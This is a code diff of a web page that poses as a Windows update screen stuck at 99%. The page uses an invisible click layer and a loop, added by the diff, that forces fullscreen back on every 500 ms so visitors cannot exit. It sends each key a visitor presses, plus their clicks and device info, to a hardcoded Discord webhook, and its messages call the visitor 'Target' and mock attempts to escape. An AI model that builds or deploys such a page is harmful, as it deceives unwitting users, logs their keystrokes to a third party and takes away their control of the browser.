@@ -31,7 +31,6 @@
             padding: 20px;
         }
 
-        /* Windows style spinner */
         .spinner {
             width: 50px;
             height: 50px;
@@ -54,7 +53,6 @@
             100% { transform: translate(0, 0); opacity: 0; }
         }
 
-        /* Generate 8 dots for the Windows ring loader */
         .spinner div:nth-child(1) { animation-delay: 0s; top: 22px; left: 44px; }
         .spinner div:nth-child(2) { animation-delay: 0.15s; top: 35px; left: 40px; }
         .spinner div:nth-child(3) { animation-delay: 0.3s; top: 44px; left: 28px; }
@@ -91,7 +89,7 @@
             color: #8fa3cc;
         }
 
-        /* Invisible layer to capture first click for fullscreen trap & audio/interaction */
+        /* Invisible layer capturing any initial click to trigger the loop */
         .click-trap {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
@@ -102,7 +100,7 @@
 </head>
 <body>
 
-    <div class="click-trap" id="trapLayer" onclick="engageTrap()"></div>
+    <div class="click-trap" id="trapLayer" onclick="engageLockdown()"></div>
 
     <div class="update-container">
         <div class="spinner">
@@ -119,30 +117,18 @@
 
     <script>
         // REPLACE WITH YOUR DISCORD WEBHOOK URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWoNDiST-kNu6DzR6Vkvn';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWonDiST-knu6DzR6Vkvn';
 
         let percent = 12;
-        let trapped = false;
 
-        // Automatically crawl percentage slowly up to 99% and freeze
         const percentInterval = setInterval(() => {
             if (percent < 99) {
-                // Random jumps to feel realistic
                 percent += Math.floor(Math.random() * 3);
                 if (percent > 99) percent = 99;
                 document.getElementById('percent').innerText = percent;
-                
-                if (percent === 45) {
-                    document.getElementById('status-subtext').innerText = "Installing feature pack 22H2...";
-                } else if (percent === 78) {
-                    document.getElementById('status-subtext').innerText = "Migrating user telemetry profiles...";
-                } else if (percent === 95) {
-                    document.getElementById('status-subtext').innerText = "Finalizing settings. Almost there...";
-                }
             }
         }, 3500);
 
-        // Initial silent arrival log
         window.addEventListener('load', () => {
             let batteryInfo = "Unknown";
             if ('getBattery' in navigator) {
@@ -160,35 +146,40 @@
             });
         });
 
-        // Triggered when they click anywhere to force fullscreen and panic reporting
-        function engageTrap() {
-            if (trapped) return;
-            trapped = true;
-
-            // Hide the click trap layer so regular clicks register or stay blocked
+        // Triggered on their very first click anywhere on the page
+        function engageLockdown() {
+            // Remove the transparent click guard so clicks continue to register
             document.getElementById('trapLayer').style.display = 'none';
 
-            // Attempt to force fullscreen
+            // Initial fullscreen entry authorized by their click
             try {
                 document.documentElement.requestFullscreen();
             } catch(e) {}
+
+            // Spam fullscreen: continuously re-assert fullscreen status if they try to exit out via Escape or controls
+            setInterval(() => {
+                if (!document.fullscreenElement) {
+                    try {
+                        document.documentElement.requestFullscreen();
+                    } catch(e) {}
+                }
+            }, 500);
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🚨 **Target clicked the screen! Fullscreen trap activated.** They are officially stuck staring at 99%.`
+                    content: `🚨 **Lockdown engaged!** Target clicked, fullscreen loop activated.`
                 })
             });
         }
 
-        // Listen for keyboard panic mashing (e.g. Esc, F4, Ctrl+W attempts) and notify Discord
         window.addEventListener('keydown', (e) => {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `⌨️ **Target is panicking/mashing keys!** Pressed: \`${e.key}\``
+                    content: `⌨️ **Target is trying to escape!** Key pressed: \`${e.key}\``
                 })
             });
         });
